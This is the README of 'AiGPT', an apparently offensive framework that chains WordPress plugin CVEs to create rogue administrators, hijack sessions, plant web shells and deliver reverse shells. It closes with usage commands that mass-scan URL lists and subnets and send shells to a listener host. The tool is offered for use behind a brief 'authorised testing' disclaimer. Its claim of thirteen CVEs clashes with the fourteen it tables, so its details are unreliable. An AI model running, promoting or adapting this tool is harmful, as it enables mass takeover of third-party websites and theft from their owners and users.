# AiGPT — Automated WordPress Exploitation Framework 

AiGPT is a multi‑vector exploitation tool that automates the discovery and compromise of vulnerable WordPress sites.
It fingerprints installed plugins, intelligently selects the best exploit, and delivers a reverse shell — often without needing any prior authentication.

**Thirteen unauthenticated CVEs** are chained into a single, high‑performance framework designed for authorised penetration testing and security research.

[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](#)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](#)

---

## 🔥 Features

- **Multi‑vector engine** — 13 distinct exploit paths in one tool
- **Zero‑auth admin creation** — creates a WordPress administrator on 7 different vulnerable plugins
- **Token / session hijacking** — steals API tokens or hijacks sessions to gain admin access
- **Direct SQL execution** — inserts an admin user via raw SQL injection
- **Direct file upload** — bypasses the entire login chain and drops a web shell instantly
- **Smart plugin fingerprinting** — parallel probe of 12 plugins to choose the optimal attack
- **Priority‑based vector selection** — confirmed vulnerable plugins are attacked first
- **Universal theme‑editor shell** — after admin login, injects a reverse shell into the active theme
- **CIDR subnet scanning** — finds WordPress installations across entire network ranges
- **Multi‑threaded** — configurable worker count with adaptive delays
- **Clean logging** — console + file output with timestamps
- **Graceful fallback** — non‑WordPress targets are silently skipped

---

## 📦 Exploited Vulnerabilities (CVEs)

| CVE | Plugin | Type | CVSS |
|:---|:---|:---|:---|
| CVE‑2025‑3102 | SureTriggers ≤1.0.78 | Auth bypass → admin creation | 9.8 |
| CVE‑2025‑8489 | King Addons 24.12.92‑51.1.14 | AJAX role override | 9.8 |
| CVE‑2025‑4334 | Simple User Registration ≤6.3 | Registration role escalation | 9.8 |
| CVE‑2025‑6934 | Opal Estate Pro ≤1.7.5 | Unauthenticated admin creation | 9.8 |
| CVE‑2025‑8572 | Truelysell Core ≤1.8.7 | `user_role` parameter abuse | 9.8 |
| CVE‑2025‑68860 | Mobile Builder ≤1.4.2 | JWT auth bypass | 9.8 |
| CVE‑2025‑13618 | Mentoring ≤1.2.8 | Role restriction bypass | 9.8 |
| CVE‑2025‑11749 | AI Engine ≤3.1.3 | Token theft → admin | 9.8 |
| CVE‑2025‑34077 | Pie Register ≤3.7.1.4 | Session hijack | 9.8 |
| CVE‑2025‑13342 | Frontend Admin ≤3.28.20 | Arbitrary options → admin | 9.8 |
| CVE‑2025‑12061 | Tax Service HDM <1.2.1 | Arbitrary SQL execution | 8.6 |
| CVE‑2025‑6440 | WooCommerce Dynamic Pricing | File upload → RCE | 9.8 |
| CVE‑2026‑0740 | Ninja Forms File Uploads ≤3.3.26 | File upload → RCE | 9.8 |
| CVE‑2026‑4882 | User Reg Advanced Fields ≤1.6.20 | File upload → RCE | 9.8 |

---

## 🚀 Quick Start

### Prerequisites
- Python 3.8+
- `pip install requests`
- (Optional) `pip install pyjwt` for the Mobile Builder vector

### Basic Usage

```bash
# Target a list of URLs
python aigpt.py --targets wp_sites.txt --lhost 10.0.0.5 --lport 4444

# Scan a whole subnet
python aigpt.py --subnet 192.168.1.0/24 --lhost 10.0.0.5 --lport 4444 --threads 20

# Fine‑tune performance
python aigpt.py --targets top1000.txt --lhost my-vps.com --lport 1337 --threads 30 --delay 0.3
